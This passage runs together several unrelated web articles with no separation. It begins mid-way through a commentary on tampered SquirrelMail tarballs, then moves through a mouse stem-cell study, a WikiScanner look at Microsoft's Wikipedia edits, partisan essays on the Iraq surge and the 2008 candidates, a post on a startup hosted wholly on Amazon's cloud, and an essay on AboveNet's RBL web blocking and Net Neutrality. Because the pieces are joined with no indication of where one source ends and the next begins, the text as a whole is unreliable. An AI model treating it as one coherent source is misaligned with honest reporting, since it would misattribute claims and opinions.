Longer - term , the increasing doubts about the security of MD5 suggest that relying on it to detect changes to tarballs might not be entirely safe .
Far better to use public - key signatures ; they should have a longer shelf life , and , if the keys are managed properly , they are impossible to replace .
It seems that the project has posted GPG signatures for 1.4.13 , though the Wayback Machine suggests that this is a recent practice .
Your editor was unable to find the public key needed to verify the signatures .
The modifications to the tarballs were done using a compromised developer 's account .
The specific changes made were not put into the SquirrelMail source repository .
The project has said nothing , though , about what has been done to ensure that no other changes were made there .
Some sort of statement from the project along these lines would be most reassuring to SquirrelMail 's users .
Perhaps the most encouraging conclusion , though , is this : there have been several attempts to compromise source distributions over the years .
Many of them have succeeded in getting bad code into high - profile packages .
But none of these attacks - so far as we know - have escaped detection for any significant period of time , and none of them have led to any sort of wide - scale exploit .
As a whole , we would appear to be reasonably resistant to this kind of attack , even when the front - line defenses fail .
With luck , and continued vigilance , that trend will continue .
Both will be required , though : there is no doubt that the attackers will keep trying .
Scientists have cured sickle cell anaemia in mice using stem cells produced without using embryos .
The procedure involved reprogramming skin cells from the mice back to an extremely flexible embryo - like state , then replacing the defective gene that caused the disease .
When the cells were injected back into mice they reversed the symptoms of the disease .
The study is the first to show that the new technique for producing stem cells , unveiled last month in Science , can be used to cure disease .
It was hailed as a development that would make cloning largely irrelevant because it allowed flexible cells to be created without using embryos .
The team took skin cells from a mouse that had been genetically modified to mimic the symptoms of sickle cell anaemia , a genetic disease which produces abnormally shaped red blood cells less efficient at carrying oxygen round the body .
The researchers modified these skin cells by inserting four genes which act together as master regulators , rewinding the cells back to an embryonic state .
Next the team coaxed the cells down a different developmental route to become the precursors of bone marrow stem cells which produce blood cells .
The team replaced the defective gene that causes sickle cell and injected them back into the mouse 's body .
They report in Science that the blood and kidney functions returned to normal .
" This demonstrates that stem cells have the same potential for therapy as embryonic stem cells , " said Rudolph Jaenisch at the Whitehead Institute for Biomedical Research .
By now most people have probably heard of WikiScanner , the web - tool used to map anonymous Wikipedia edits against a list 2.6 million known IP ranges owned by some of the most reputable organizations and companies in the world .
Naturally , people start by scrutinizing the obvious targets such as the CIA , but what about our friends over at Redmond ?
Has any one of the 49,000 employees on - campus at Microsoft HQ been having a bit of fun with Apple ’s Wiki ?
And the answer is an anticlamatic no .
Microsoft employee , or at least those who made anonymous Wikipedia edits during those long breaks between Windows releases , are a rather boring mixed bunch .
From within the IP range 207.46.0.0 to 207.46.255.255 which belongs to Microsoft Corp , Microsofties have been recorded doing a bit of everything – some knew what they were doing , others did n’t .
Although one particular edit stood out for me , an edit to Apple ’s wiki .
Before your imagination runs wild , it ’s not what you think .
In fact , it ’s quite the opposite as this Microsoft employee was the first to remove some obvious vandalism , which had “ Apple Inc sucks ” added 2 minutes earlier by another anonymous user in Australia .
Even after all the humiliation from Apple , I thought this was a meaningful act of decency .
Whilst I ’m at it , Microsoft ’s public - relations duo – Waggener Edstrom and Edelman appears to be doing nothing out of the ordinary as well .
Just the obligatory self Wikipedia entry edits as well as correcting product rumors .
On the other hand , what is this Apple employee doing to Robert Scoble ’s page ?
Got a little too zealous of the iPhone ? 😉
If the latest polls are to be believed , the Republican frontrunner is John McCain , who favors continuing the Iraq War for decades if not centuries , and the leading Democrat is Hillary Clinton , who voted to give George W. Bush the power to start the misadventure in 2002 and remained a staunch war supporter until the eve of Campaign 2008 .
In Congress , the Democrats appear so spooked about being accused of “ partisanship ” that they have replaced their periodic little white flags of surrender to President Bush on Iraq with a permanent large one .
For his part , Bush is on his own personal victory lap of the Middle East , hailing the success of his “ surge . ”
In the U.S. news media , the Washington Post ’s editorial page , which beat the drums early and often for invading Iraq , is not only still run by the same neoconservative writer , Fred Hiatt , but is still baiting those who “ refuse to acknowledge progress in Iraq , ” much as the Post ridiculed and marginalized early war opponents .
At the New York Times , publisher Arthur Ochs Sulzberger Jr. sought out and recruited prominent neoconservative writer William Kristol to bolster the op - ed ranks of other Iraq War enthusiasts , David Brooks and Thomas L. Friedman .
( Sulzberger ’s reputed first choice , Charles Krauthammer , was already locked up by the Washington Post . )
So , even though the neocons ( and their political / media fellow travelers ) deceptively maneuvered the United States into possibly the worst national security debacle in the nation ’s history ( or acquiesced to the catastrophe ) , they pretty much have avoided any real accountability and have a good chance of dodging any in the future .
In one of his first Times op - eds , Kristol followed the lead of the Post ’s Hiatt in pounding the new drum of neocon triumphalism by mocking Democratic presidential candidates for failing to recognize the great “ leadership of … George W. Bush ” and praise his courageous “ surge ” policies .
Kristol took particular pleasure in hoisting war critics on their own petard by suggesting that it is the neocons who respect objective reality and it is the war opponents who are living in a fantasy world .
Though the neocons promoted the deadly falsehoods about Iraq ’s weapons of mass destruction and Saddam Hussein ’s fictional collaboration with al - Qaeda , Kristol charged that Sen.
Barack Obama ’s “ view of the current situation in Iraq is out of touch with reality . ”
Kristol took particular aim at Obama ’s argument that it was the Iraqi perception of likely Democratic victories , which could herald a U.S. withdrawal , that encouraged the various Iraqi factions ( both Shiite and Sunni ) to tamp down their internecine violence and prepare for a post- occupation struggle without an American presence .
Kristol rejected this Obama argument , ironically by citing the pre-surge September 2006 agreement between U.S. commanders and Sunni tribal leaders , who turned against extremist al - Qaeda elements before the Democrats won control of Congress in November 2006 .
[ NYT , Jan. 14 , 2008 ]
( Kristol ’s point , however , unintentionally undercut the importance of Bush ’s troop “ surge , ” which was n’t announced until January 2007 . )
Why the Drop - off in Casualties
Though there is some logic behind Obama ’s argument , other factors also played into the drop - off of casualty figures since summer 2007 .
For one , the United States backed away from the aggressive tactics that were pursued during the early months of the “ surge ” and that led to a politically unacceptable spike in the U.S. death toll .
( That spike made 2007 the deadliest year since the U.S. invasion in 2003 and helped push the total of U.S. dead to almost 4,000 , not to mention the hundreds of thousands of Iraqis killed . )
In effect , U.S. commanders accepted a de facto armistice on large - force movements against nationalistic Sunni insurgents and Shiite militias linked to radical cleric Moqtada al - Sadr .
Even risky Special Forces operations were curtailed , according to well - placed U.S. intelligence sources .
By summer 2007 , U.S. forces in Iraq were relying increasingly on remote - controlled Predator drones , high - tech optical devices for detecting night - time movements , and low - risk air strikes to kill suspected insurgents , much like the tactics that Israel uses against Hamas militants in Gaza .
During the early phase of the “ surge , ” U.S. forces also detained “ military age males ” on the slightest suspicions .
The mass detentions took many so - called MAMs off the streets and built up an Iraqi biometric data base ( now exceeding one million people ) for future field access by mobile satellite hookups .
A leading Pentagon weapons designer , Anh Duong , explained how the biometric data would help the war effort .
“ A war fighter needs to know one of three things :
Do I let him go ?
Keep him ?
Or shoot him on the spot ? ” Duong told the Washington Post .
[ See Consortiumnews.com ’s “ Mobile Labs Target Iraqis for Death . ” ]
Even before these mobile satellite hookups began to be brought online this year , U.S. forces were applying loose “ rules of engagement ” that allowed them to kill Iraqis on the slightest indication they might be insurgents , a reality that rarely gets front - page attention in the U.S. media , except as an afterthought .
For instance , a New York Times investigation cited 121 cases of veterans from the Iraq and Afghan wars returning home and then being implicated in killing other Americans .
The article evinced sympathy for these stressed - out U.S. soldiers , but a secondary element of the article was that some were wracked by guilt for having killed innocent Iraqis .
Seth Strasburg of Arnold , Nebraska , who pleaded guilty to manslaughter in connection with a drunken New Year ’s Eve shooting in 2005 , recounted how in 2004 , west of Mosul in Iraq , he was posted in an abandoned bus and assigned to look for Iraqis who might be planting roadside bombs .
When Sgt. Strasburg saw an Iraqi man looking for something in the dirt and then dragging a sack toward the road , he radioed the information to his superiors .
Strasburg told the Times : “ They said , ‘ Whatever , use your discretion . ’
So I popped him . ”
It turned out the sack contained nothing but gravel .
“ I reported the kill to the battalion , ” Strasburg said .
“ They said , you know , ‘ Good shot .
It ’s legal .
Whatever .
Do n’t worry about it . ’
After that , it was never mentioned .
But , you know , I had some issues with it later . ”
[ NYT , Jan. 13 , 2008 ]
Successful Repression
Another little - acknowledged factor in the supposed success of Bush ’s “ surge ” is that repression – if inflicted brutally enough over a long period – can work .
Throughout history , conquerors have achieved dominance over other people by engaging in mass slaughters or by inflicting severe economic deprivations .
Eventually , much of the population succumbs and accepts foreign control , even if some nationalist elements continue to resist .
That appears to be where President Bush is headed on Iraq as he tours the Middle East claiming vindication for his “ surge ” strategy .
“ A lot of people thought that I was going to recommend pulling out [ of Iraq ] or pulling back , ” Bush said while visiting Camp Arifjan , a U.S. base in Kuwait .
“ Quite the contrary , I recommended increasing the number of forces so they could get more in the fight , because I believed all along if people are given a chance to live in a free society , they ’ll do the hard work necessary to live in a free society . …
“ There is no doubt in my mind that we will succeed .
There is no doubt in my mind when history is written , the final page will say : ‘ Victory was achieved by the United States of America for the good of the whole world . ’ ”
In the shorter term , Bush indicated that he was prepared to halt any reduction in U.S. force levels when they hit about 130,000 or roughly where they were before he dispatched 30,000 additional troops for the “ surge . ”
“ My attitude is , if he [ Gen. David Petraeus ] did n’t want to continue the drawdown , that ’s fine with me in order to make sure we succeed , see , ” Bush told reporters .
“ I said to the general , ‘ If you want to slow her down , fine . ’
It ’s up to you . ”
[ Washington Post , Jan. 13 , 2008 ]
Some Iraqi officials also are looking forward to a long - term commitment of U.S. troops , not to mention the delivery of expensive American military hardware .
During a U.S. visit , Iraqi Defense Minister Abdul Qadir said he favored the continuation of a significant U.S. troop presence , to protect Iraq ’s borders , until at least 2018 and possibly beyond .
[ NYT , Jan. 15 , 2008 ]
The Frontrunners
Sen. McCain of Arizona , the new Republican frontrunner , said the U.S. military presence in Iraq could extend even further into the future .
On Jan. 9 , the day after winning the New Hampshire primary , McCain was asked on ABC ’s “ Good Morning America ” about a comment he had made that the U.S. presence in Iraq “ could be 100 years . ”
McCain responded , “ could be 1,000 , could be 1,000 years or a million years . …
It ’s a fallacious argument by people who do n’t understand that it ’s not American presence , it ’s American casualties .
If we can get American casualties down and eliminate them , Americans are not concerned . ”
In other words , McCain is saying that the American public would be content with the United States becoming a long - term imperial power in the Middle East as long as U.S. military casualties could be minimized .
Stripped away of the window - dressing rhetoric about “ democracy , ” McCain ’s position is essentially the neocon position : permanent U.S. bases in Iraq as a means of projecting American military power throughout the region and suppressing Muslim threats to the security of Israel .
So , as long as high - tech means can be used to kill suspicious Iraqis while keeping American deaths to politically acceptable levels , the U.S. occupation could go on indefinitely .
Meanwhile , Sen. Clinton of New York , who tops national Democratic polls , has opted for what looks like an audacious Karl Rove - like strategy of attacking Sen .
Obama on his perceived strong point , his early vocal opposition to invading Iraq .
The Clinton campaign has targeted Obama ’s failure to join the staunchest anti-war Senate Democrats in opposing all funding for the Iraq War as an argument that there is no real difference between him and Hillary Clinton on the war .
That was the context of former President Bill Clinton ’s harsh dismissal of Obama ’s anti-war credentials as “ the biggest fairy tale I ’ve ever seen . ”
Sen .
Clinton picked up on the theme on NBC ’s “ Meet the Press ” on Jan. 13 , attacking Obama for voting for $ 300 billion in war funding and opposing pullout “ timelines and deadlines , initially . ”
Then , she added : “ So I think it 's important that we get the contrasts and the comparisons out .
I think that 's fair game . ”
A casual viewer tuning in “ Meet the Press ” might well have gotten the impression that Sen.
Clinton had been a brave Iraq
War opponent , when the reality was that she consistently supported the Iraq
War from her vote for the war resolution in 2002 until she repositioned herself as a war critic as she began competing for the Democratic presidential nomination in 2007 .
Later in the program , host Tim Russert challenged her on exactly that point , playing excerpts from her Senate floor speech supporting the Iraq War resolution and Obama ’s speech opposing the war .
“ So it is with conviction that I support this resolution as being in the best interest of our nation , ” Clinton said on Oct. 10 , 2002 .
“ And it is a vote that says clearly to Saddam Hussein , this is your last chance .
Disarm or be disarmed . ”
Russert then noted that on the same week , Obama gave a speech , saying : " I know that Saddam poses no imminent and direct threat to the United States , or to his neighbors .
... I know that even a successful war against Iraq will require a U.S. occupation of undetermined length , at undetermined cost , with undetermined consequences . …
I am not opposed to all wars .
I 'm opposed to dumb wars . "
Russert then asked Clinton , “ Who had the better judgment at that time ? ”
Avoiding a direct answer , Clinton insisted that her pro-war vote “ was not a vote for preemptive war . …
It was a vote to put inspectors back in to determine what threat Saddam Hussein did in fact pose . …
My belief was we did need to pin Saddam down , put inspectors in .
But I said I was against preemptive war , I spoke against it . ”
Though Clinton then tried to turn the discussion back onto Obama ’s alleged inconsistency , Russert said , “ I want to stay with your vote because that same day , Senator [ Carl ]
Levin offered an amendment , the Levin amendment , and this is how the New York Times reported it .
‘ The [ Levin ] amendment called ... for the U.N. to pass a new resolution explicitly approving the use of force against Iraq .
It also required the president to return to Congress if his U.N. efforts failed .’ ...
“ You voted against Carl Levin , who was saying give diplomacy a chance and yet you said no .
You voted to authorize war .
The resolution you voted for , Robert Byrd said was a blank check for George Bush .
Ted Kennedy says it was a vote for war .
James Carville and Paul Begala said anyone who says that vote was n't a vote for war is bunk . ”
Clinton responded , “ Well , Tim , if I had a lot of paper in front of me , I could quote people who say something very differently , so I know you 're very good at this and I respect it , but let 's look at the context here .
Number one , the Levin amendment , in my view , gave the Security Council of the United Nations a veto over American presidential power .
I do n't believe that is an appropriate policy for the United States , no matter who is our president . …
“ It is absolutely unfair to say that the [ war resolution ] vote as Chuck Hagel , who was one of the architects of the resolution , has said , was a vote for war .
It was a vote to use the threat of force against Saddam Hussein , who never did anything without being made to do so . ”
Title of War Resolution
Russert then reminded Clinton , “ The title of the act was ‘ The Authorization for Use of Military Force against Iraq ’ resolution . ”
Clinton : “ Now , we can sit here and argue about 2002 or we can say what has happened since and what needs to happen going forward in the future .
And I think that you have two different story lines here .
You have Senator Obama 's story line , the speech he gave in ' 02 , to his credit , which then was not followed up on .
By '03 , it was off his Web site .
By ' 04 , he was saying he did n't know [ how ] he would vote and that he basically agreed with George Bush on the conduct of the war .
There were others , Tim , who voted against it , spoke out against it and never wavered over that period of time . ”
Russert : “ But you voted for all the funding for the war . ”
Clinton : “ I did .
I never -- I 'm not premising my campaign on something different . ”
Russert : “ And then until '06 was against the timetable . ”
Clinton : “ But I did what I -- my principal concern has always been doing what I thought was best for our country and what I thought was best for our troops .
I 'm not here saying anything different than that .
I 'm not giving you a story line that does not hold up ... under the facts and the times we were in . ”
Russert : “ Did he [ Obama ] have better judgment in October of 2002 ? ”
Clinton : “ You know , look , judgment is not a single snapshot .
Judgment is what you do across the course of your life and your career . ”
Russert : “ A vote for war is a very important vote . ”
Clinton : “ Well , you know , Tim , we can have this Jesuitical argument about what exactly was meant .
You know , when Chuck Hagel , who helped to draft the resolution , said it was not a vote for war , when I was told directly by the White House in response to my question , ‘ if you are given this authority , will you put the inspectors in and permit them to finish their job , ’ I was told that 's exactly what we intended to do .
“ Now , I think it 's important to take a look at the entire context here .
If Senator Obama 's going to get credit for his speech and his position against the war , then he deserves to be asked what happened in ' 03 , ' 04 , '05 , '06 and '07 .
I voted for the authorization .
...
And his answer was very political . …
I mean , his whole point is that he does n't make political decisions . ”
As the Democratic presidential campaign moves into a decisive phase over the next several weeks , Clinton ’s strategy appears to be to muddy the waters about Obama ’s purity as a critic of the Iraq War and thus minimize any advantage he might have with voters for having the foresight to oppose the original war vote .
In doing so , Clinton seems to have taken a page from Karl Rove ’s playbook that calls for attacking opponents at the point of their perceived greatest strength .
In 2000 , Rove made a mockery of Al Gore ’s early support for the Internet and advanced technology ; in 2004 , Rove helped demean John Kerry ’s heroism in the Vietnam War .
Now , Hillary Clinton is trying to make Obama look like a hypocrite for highlighting his opposition to the Iraq War .
In effect , she is trying to transform a major Obama positive into a negative .
How well that strategy works remains to be seen .
But it is clear that if the current poll standings hold up – and the two major parties nominate John McCain and Hillary Clinton – the overriding message will be that no one will pay a serious political price for handing George W. Bush a blank check for war in 2002 .
And elsewhere within the U.S. political and media establishments , virtually all the architects and all the apologists for the war will continue to profit from their positions while avoiding any meaningful accountability .

That ’s called perjury , in some parts .
It ’s also called , someone in the Pentagon has Petraeus ’ number and is leaking information .
Not so well respected after all , is he ?
NEWSWEEK has learned that a separate internal report being prepared by a Pentagon working group will “ differ substantially ” from Petraeus ’s recommendations , according to an official who is privy to the ongoing discussions but would speak about them only on condition of anonymity .
An early version of the report , which is currently being drafted and is expected to be completed by the beginning of next year , will “ recommend a very rapid reduction in American forces : as much as two - thirds of the existing force very quickly , while keeping the remainder there . ”
The strategy will involve unwinding the still large U.S. presence in big forward operation bases and putting smaller teams in outposts .
“ There is interest at senior levels [ of the Pentagon ] in getting alternative views ” to Petraeus , the official said .
Among others , Centcom commander Admiral William Fallon is known to want to draw down faster than Petraeus … .
Even some supporters of the surge effort wonder whether Petraeus is n’t thinking as much about selling the war as winning it ….
John Arquilla , an intelligence and counterinsurgency expert at the Naval Postgraduate School , is even harsher in his assessment of Petraeus .
“ I think Colin Powell used dodgy information to get us into the war , and Petraeus is using dodgy information to keep us there , ” he said .
“ His political talking points are all very clear : the continued references he made to the danger of Al Qaeda in Iraq , for example , even though it represents only somewhere between 2 and 5 percent of the total insurgency .
The continued references to Iran , when in fact the Iranians have had a lot to do with stability in the Shiite portion of the country .
And it ’s not at all clear why things are a little better now .
Is it because there are more troops , or is it because we ’re negotiating with the insurgents and have moved to small operating outposts ?
On any given day we do n’t have more than 20,000 troops operating .
The glacial pace of reductions beggars the imagination . ” ….
Petraeus called in a large press gaggle to observe training exercises at his local Iraqi military training academy .
Later , back in Baghdad , Bremer shook his head and laughed indulgently .
“ He loves headlines , ” Bremer said .
I ’m sure this is n’t the only one , after all , SmugMug ‘s CEO told me that they had moved pretty much everything over to Amazon ’s S3 a while back .
But I always assumed that companies would have at least one server keeping things up , just in case Amazon went down .
Or just because .
I was wrong .
Last night Mogulus ’s CEO , Max Haot , was here at my house to film something fun for my show .
Mogulus is the company that , yesterday , provided the live video for Om Malik ’s NewTeeVee conference .
It was so good I stayed home and watched almost the whole day on the NewTeeVee channel .
But more on that when we get the video up .
At one point Max seemed like he was joking around with me when he told me “ we do n’t own a single server . ”
I asked him FOUR more times to make sure I heard him right .
I even got incredulous with him at one point saying something like “ what the f*** do you mean you do n’t own a server ? ” and “ you mean not a single bit of your Web site comes from servers that are n’t owned by Amazon ? ”
He nicely and calmly explained that , yes , every server the company owns is actually running on Amazon ’s S3 and EC2 services .
The world has changed .
Now ANYONE can build an Internet company and get it up to scale .
No more spending nights inside data centers trying to keep servers running .
Let ’s go over to Mike Arrington ’s CrunchBase and do some research .
They pulled in $ 1.2 million in funding .
Yet they do n’t own a SINGLE server !
They have about 15,000 people already creating live video channels .
They have one of the most innovative Web sites I ’ve ever seen .
But they do n’t own a server .
How else has the world changed ?
Where the hell is Microsoft in this whole business ?
How did Microsoft screw this up so badly ?
Let ’s get this straight .
Amazon used to be a book store .
Now they are hosting virualized servers for Internet companies .
So much for having billions of dollars in the bank like Microsoft does , some of the smartest people in the world working in your research arms and having “ monopoly ” market share in operating systems .
Heheh , maybe now Amazon can use some of the new money that they ’ll be earning from these startups to buy some decent PR .
According to Read / Write Web Amazon needs the help in that department .
Oh , back to Max .
One tip he gave us is that when using Amazon ’s services you have to design your systems with the assumption that they will never be up and running .
What he means by that is services are “ volatile ” and can go up and down without notice .
So , he ’s designed his systems to survive that .
He told me that it meant his engineering teams had to be quite disciplined in designing their architecture .
How many other Internet companies are out there that are “ serverless ? ”
In the aforementioned instance , AboveNet and TeleGlobe were not selling " parental filters " or other common types of filtered Internet access ; the users being blocked from our Web sites were adults paying for what they thought were unfiltered Internet connections .
What had happened was that AboveNet and TeleGlobe signed up to block Web sites on the Realtime Blackhole List , a list which was widely ( but inaccurately ) thought to be a list of " spammers " , put out by a group called the Mail Abuse Prevention System .
( MAPS and the RBL still exist , but under new management and in a form that bears little resemblance to their late - 90's forerunners . )
Most ISPs that used the RBL used it to filter only incoming e-mail , but AboveNet went all - out and blocked users from even viewing RBL 'ed web sites , presumably because two of MAPS 's founders , Paul Vixie and Dave Rand , were on the AboveNet board of directors .
And it turned out that the RBL not only included spammers , but also Web sites that were not sending mail at all but were blocked because of their content -- in our case , our ISP got blocked because some other customers were selling mailing list software that MAPS believed could be too easily abused by spammers .
These two distinctions -- ( 1 ) the distinction between blocking incoming e-mail from spammers , versus blocking Web sites ; and ( 2 ) the distinction between blocking traffic due to spam activity , versus blocking sites because of their content -- both go to the heart of what Net Neutrality is , and is n't , about .
Net Neutrality is about user preferences -- not meaning that as a buzzword , but as an actual guiding principle to figure out what is and is not covered by the cause .
If an ISP filters incoming mail from known spammers , that generally improves the user experience , and is something many users would expect an ISP to do anyway .
But if an ISP blocks users from reaching Web sites ( even , for the sake of argument , the Web sites of actual spammers ) , then that 's generally counteracting the user 's wishes -- if the user did n't want to go there , they would n't have typed it in .
( After all , I visit spammers '
Web sites all the time , usually right before I sue them . )
Similarly , if an ISP blocks traffic from sites because of spam or other network abuse , that serves to protect their own users .
But if an ISP blocks users from viewing sites because of their content , that 's generally not expected by users , unless they 've specifically signed up for something like parental controls .
The Snowe Net Neutrality amendment proposed last year recognized both of these distinctions , and stated that nothing in the amendment would be interpreted to prohibit spam filtering , parental control services , or measures to protect network security .
The MAPS incident thus shaped most of my opinions about Net Neutrality 6 years before the debate even had a name .
When I first found out in August 2000 that our ISP was blacklisted , like most people I believed that the RBL really was a list of spammers ; after all the MAPS web page said that the RBL was a list of networks that " originate or relay spam " .
So I called my ISP screaming at them for being incompetent spam- enablers ( the culmination of many frustrating issues with them ) , and saying that if they really were letting customers send spam , or running an insecure server that spammers were hijacking , I would leave on principle , if the cretins managing our server did n't drop it in the lake first .
The ISP owner then told me what happened : that the ISP was not blacklisted for spamming customers , but because of the content of the other sites .
( Buried in the list of RBL criteria on MAPS 's site was the statement that sites could be blacklisted for providing " spam software " , although the criteria did not define how they distinguished between spam software and regular mailing list software , which is how our ISP got caught in the net .
And the criteria did not disclose anywhere the most controversial feature of the RBL , which is that if an ISP did n't comply , MAPS would start blacklisting other unrelated sites at the same ISP to put more pressure on them . )
I agreed that this seemed to be absurd , and said I would n't leave the ISP if they were being blackballed just because of the content of hosted pages .
I do n't know exactly what the mail software in question did or where MAPS thought the line should be drawn , but I am a purist about content -- it 's a long - standing principle among the Internet security community that if a tool exists which exploits a security hole , you do n't try to make the software disappear , you fix the hole .
And besides , since MAPS and their supporters wanted to blackball ISPs that hosted spamming software ( however you defined that ) , but the same people had never advocated blackballing ISPs that hosted network break - in tools and other cracking programs , for example , then what were they really saying ?
That spamming someone more unethical than breaking into their network ?
But by far the most common objection to my complaint about AboveNet blocking Web sites was , " Hey , if a private company blocks things , as long as they 're being honest to their users about it , who cares ? "
Well , true , but the fact that AboveNet blocked Web sites was not widely known even within the company ; when I once called AboveNet feigning ignorance and asking them if they blocked RBL 'ed Web sites , the technician who spoke to me said , " No , that would n't make any sense . "
( Well , half right . )
Their AUP mentioned " protecting users from spam " but said nothing about blocking Web sites .
In fact , other than " family - filtered " ISPs and similar services , I 've never heard of any company blocking Web sites that actually did try to make their users aware of it .
( On the other hand , even if AboveNet had fully disclosed their filtering , they were still a backbone company selling connectivity mainly to ISPs -- and I think if you sell something wholesale that can only be re-sold to the public by fraudulent means , then you 're at least partly complicit in that fraud as well . )
If you 're tempted to argue that backbone providers should be allowed to block whatever they want as long as they bury it in their AUP ( although AboveNet and TeleGlobe did n't even do that much ) , just consider :
When you access Google from your home computer , have you read the AUP of every network that the packets pass through , to check whether they reserve the right to block or even modify your traffic ?
Without doing a traceroute , could you even name all the networks that the traffic passes through ?
Do you really want the burden to be on you to check with all of them every time there 's a problem reaching a Web site ?
Or do you feel like there 's an understanding that as long as you pay your bill , they should let you go wherever you want ?
Some have argued that if an ISP blocks the user from reaching a Web site , then even if the ISP is defrauding the user , that 's still strictly an issue between the user and the ISP .
But if a user is trying to reach your Web site , the user is trying to give you something of value : their attention , their eyeballs on your advertisements , sometimes even their money ( with the expectation that you will provide them with something in return , of course , like some content worth reading ) .
If the ISP steps in and blocks that , then the ISP has taken something of value that the user was attempting to give to you , and diverted it to serve their own interests .
To me that does n't seem ethically much different from the FedEx driver swiping the chocolates that someone tried to send you for Valentine 's Day .
Is that just between the sender and FedEx ?
Or do you have a beef because you did n't get the present that was intended for you , and you had to eat last week 's chocolates to cheer up ?
The modern - day threats to Net Neutrality are different : slowing access to Web sites unless the site owners pay a " toll " , instead of blocking access to sites because of the content of other sites hosted at the same ISP .
But they both boil down to the same thing : not giving end users what they have already paid for .
If a user buys Internet access , they almost always buy it with the understanding that if they access a site , the content will download as quickly as their connection allows .
Thus the most common misconception about Net Neutrality is that the proponents are fighting against " capitalism " -- ISPs just charging more for different delivery speeds .
But ISPs are already charging users for those delivery lines -- including different tiers for different prices .
That 's capitalism , and it works , with prices falling all the time in a fairly competitive market .
But charging publishers for those higher delivery speeds to the user 's house , is really more like double - billing , because the user has already been charged once for the lines that the content is coming over , so the ISP is trying to charge the content publisher again for the same service .
Of course , if you charge party A for doing X , and then you try to charge party B for the same instance of doing X , and party B does n't pay up so you do n't do X , you 're also breaking your deal with A. Brad Templeton of the EFF stated as much on his blog in 2006 :
The pipes start off belonging to the ISPs but they sell them to their customers .
The customers are buying their line to the middle , where they meet the line from the other user or site they want to talk to .
The problem is generated because the carriers all price the lines at lower than they might have to charge if they were all fully saturated , since most users only make limited , partial use of the lines .
When new apps increase the amount a typical user needs , it alters the economics of the ISP .
They could deal with that by raising prices and really delivering the service they only pretend to sell , or by charging the other end , and breaking the cost contract .
They 've rattled sabres about doing the latter .
And I think the same is clearly true if , instead of trying to extract money from the content publisher , the ISP tries to extract something else , like an agreement to shut down certain Web sites before the ISP will let their users view other sites hosted at the same company .
You can talk all day about how evil those Web sites are , but the ISP hasthe user a connection with the implied ability to access them .
Anyway , this all came out in 2000 when a Slashdot article revealed that AboveNet had been blocking Web sites , and AboveNet stopped doing it two hours after the article came out .
( Tele Globe stuck with it for a few more months . )
But from the hostility of the reaction , you 'd think that we had published cartoons in a Danish newspaper showing Paul Vixie with a bomb in his turban .
I got more e-mails than I could count arguing that AboveNet had the right to block whatever Web sites they felt like , regardless of whether the end users knew it was happening .
To those people , I 'd be sincerely interested in their answer to this question :
Does that mean they 've have no problem if they found out their ISP was silently blocking sites for political reasons ?
There is a clear line between following user preferences by blocking spam , and countermanding user preferences by blocking sites because of their content -- and once you 've crossed that line , where 's the logical stopping point ?
Seriously , I would have liked to have known how they would answer that , if I could have gotten any meaningful dialog going with them , which most of the time I could n't .
At the time , I 'd just spent four years telling people that kids looking at porn was a non-issue , and that by the way if their kids came to my Web site I 'd even help them get around their blocking software , and I still got more angry e-mails for disclosing the fact that AboveNet blocked Web sites based on their content , than I 'd gotten in all the previous four years combined .
( A few even accused us of moving into a blacklisted address block on purpose .
This was because the actual move happened after the blacklisting was in place , even though I told them all that our ISP had announced the coming move two months before -- repeat , before -- they ever heard from MAPS .
Some people were so in love with that " smoking gun " that they did n't believe me ; that 's their prerogative .
But do n't take my word for it -- when one supporter wrote to MAPS to ask about un - blocking our site , MAPS officer Kelly Thompson replied :
> Would it be possible to
> selectively unblock peacefire.org ( 209.211.253.169 ) ?
Technically ?
Yes , it is .
It 's a violation of our policy , though , so I can't do so .
I would be willing to help you find other free or reduced cost hosting , however .
It was MAPS 's decision , not ours or our ISP 's , to have our site blocked .
That should settle that once and for all , just as soon as there is peace in the Middle East and a black lesbian in the White House . )
But what do all these people think about Net Neutrality , 6 years later ?
I tried to track down the influential people who had spoken out supporting AboveNet 's blocking of Web sites , or at least their right to block Web sites .
My position was , we can agree to disagree on that , but if they really feel that way , why have n't they been speaking out against Net Neutrality ?
The proposed Snowe amendment was pretty clear :
SEC . 12 . INTERNET NEUTRALITY
( a) Duty of Broadband Service Providers -
With respect to any broadband service offered to the public , each broadband service provider shall --
(1 ) not block , interfere with , discriminate against , impair , or degrade the ability of any person to use a broadband service to access , use , send , post , receive , or offer any lawful content , application , or service made available via the Internet .
John Levine , webmaster of Abuse .
Net , head of the IRTF 's Anti-Spam Research Group , and one of the most vocal critics of Peacefire 's campaign against AboveNet 's
Web filtering , said that he would have opposed the bill but did n't bother because it did n't have much chance of passing .
Well , it did n't , but the bill was significant not because of its likelihood of passage , but because it articulated the principles that the Net Neutrality coalition had rallied around , and with the momentum behind the movement , it 's likely to achieve at least some of its goals , by legislation or otherwise .
Paul Vixie , Dave Rand , and Steve Linford did not respond to requests for comment on Net Neutrality .
But Paul Vixie wrote something very interesting in a May 2006 blog post :
Second , there 's network neutrality .
In telephone service , the government mandates that all companies providing voice - grade telephony interconnect with eachother at preset rates , thus ensuring that any phone can call any other phone and that new phone companies can enter the field to help ensure competition .
In Internet service , the government mandates nothing .
Recently SBC ( I mean AT&T , I think , is it Wednesday ? ) rattled its sabre and said that Google and other content supplying companies should be paying for the use of SBC 's backbone to reach SBC 's eyeballs .
Most of us said , uh , what ?
" Are n't SBC 's own customers paying SBC to carry that traffic ? "
Some of us even said " I am not an eyeball , I am a person ! "
But anyway , from time to time these Internet companies shut down interconnects in hopes of creating new cash flows among eachother , and until the government regulates this , we 're all at risk of higher prices or lower service with zero notice .
Some well meaning democrats are trying to challenge this with " network neutrality " legislation , but this probably is n't their year .
Or their decade .
San Francisco has a government , though .
And if San Francisco owned and operated its own wireless Internet plant , we could mandate that any Internet company wishing to do business in this city interconnect at fair and reasonable cost to all other Internet companies wishing to do business in this city .
" Until the government regulates this " ?
" Government mandates " ?
" Fair and reasonable cost " ?
Quick , call the anti-socialist intervention squad !
How long does it take those San Francisco hippies to suck the new arrivals ' brains out anyway ?
Of course , I agree with everything he said .
It 's just that if you replace " create new cash flows " with " try to get ISPs to remove content from their servers " , this describes exactly what Vixie and AboveNet were doing a few years earlier .
He 's a smart guy , and I 'm sure this did n't escape his sense of irony , so perhaps this confirms something I 'd suspected all along , which is that Vixie understood the subtleties of the issue better than most of his cheerleaders , and may be having second thoughts about AboveNet 's Web - blocking misadventure .
From the beginning , in a 1997 interview with Sun World , he sounded like someone trying to at least keep an open mind :
Concentration of power into a single individual :
It 's very true that power has corrupted every individual in whom it has ever been concentrated in the history of mankind .
I do not feel that I am necessarily above whatever elements of human nature give rise to that .
